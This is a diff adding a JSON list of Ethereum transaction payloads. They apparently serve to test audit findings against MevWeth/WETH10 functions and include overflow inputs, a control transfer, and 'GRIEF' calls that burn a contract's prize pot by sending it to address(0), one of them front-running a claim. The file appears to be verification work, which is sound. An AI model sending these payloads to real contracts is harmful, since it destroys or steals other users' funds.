@@ -1,0 +1,93 @@
+[
+  {
+    "id": 1,
+    "finding": "MevWeth.getMev(uint256) @ :50",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0xf8e5c10200000000000000000000000000000000000000000000000029a2241af62c0001",
+    "note": "Report claims an overflow lets you claim more than the pot. Uses pot+1."
+  },
+  {
+    "id": 1.1,
+    "finding": "MevWeth.getMev(uint256) @ :50",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0xf8e5c1028000000000000000000000000000000000000000000000000000000000000000",
+    "note": "2^255 payload, the value the report calls \"the computed wrap input\"."
+  },
+  {
+    "id": 1.2,
+    "finding": "MevWeth.getMev(uint256) @ :50",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0xf8e5c102ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+    "note": "type(uint256).max payload to force a wrap of the balanceOf credit."
+  },
+  {
+    "id": 2,
+    "finding": "MevWeth.getMev(address,uint256) @ :65",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0xea3e3e3e000000000000000000000000000000000000000000000000000000000badc0de8000000000000000000000000000000000000000000000000000000000000000",
+    "note": "Overflow-into-attacker payload for the 2-arg getMev."
+  },
+  {
+    "id": 2.1,
+    "finding": "MevWeth.getMev(address,uint256) @ :65",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0xea3e3e3e000000000000000000000000000000000000000000000000000000000badc0deffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+    "note": "type(uint256).max payload for the 2-arg getMev."
+  },
+  {
+    "id": 3,
+    "finding": "WETH10.transfer @ :316",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0xa9059cbb000000000000000000000000000000000000000000000000000000000badc0deffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+    "note": "Credit-overflow payload on the recipient. Attacker holds 0 METH, so the debit guard must stop it."
+  },
+  {
+    "id": 3.1,
+    "finding": "WETH10.transfer @ :316",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0xa9059cbb000000000000000000000000000000000000000000000000000000000badc0deffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+    "note": "Repeat of the max payload to confirm the guard, not an accident."
+  },
+  {
+    "id": 4,
+    "finding": "WETH10.transferFrom @ :359",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0x23b872dd0000000000000000000000002222222222222222222222222222222222222222000000000000000000000000000000000000000000000000000000000badc0deffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+    "note": "Overflow the recipient credit by moving an impossible amount from a funded victim."
+  },
+  {
+    "id": 5,
+    "finding": "WETH10.transferAndCall @ :389",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0x4000aea0000000000000000000000000000000000000000000000000000000000badc0deffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000",
+    "note": "Overflow the recipient credit through the ERC677 path."
+  },
+  {
+    "id": 100,
+    "finding": "CONTROL transfer of a funded balance",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0xa9059cbb00000000000000000000000055555555555555555555555555555555555555550000000000000000000000000000000000000000000000000de0b6b3a7640000",
+    "note": "Alice transfers 1 METH to a probe address - the debit/credit pair must still work."
+  },
+  {
+    "id": 200,
+    "finding": "GRIEF: getMev(address) with to=address(0)",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0x848316fb0000000000000000000000000000000000000000000000000000000000000000",
+    "note": "Anyone can name an unredeemable recipient and burn the whole prize pot at gas cost only."
+  },
+  {
+    "id": 201,
+    "finding": "GRIEF: getMev(address) with to=the contract itself",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0x848316fb000000000000000000000000cb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "note": "Same via the contract address; its own balanceOf can never be withdrawn."
+  },
+  {
+    "id": 300,
+    "finding": "GRIEF: front-run getMev(address(0)) before a claim",
+    "to": "0xcb34c8ed2ef15c795b298118c4d73dd9009f1e33",
+    "data": "0x848316fb0000000000000000000000000000000000000000000000000000000000000000",
+    "note": "Attacker burns the pot one transaction ahead of the intended recipient."
+  }
+]
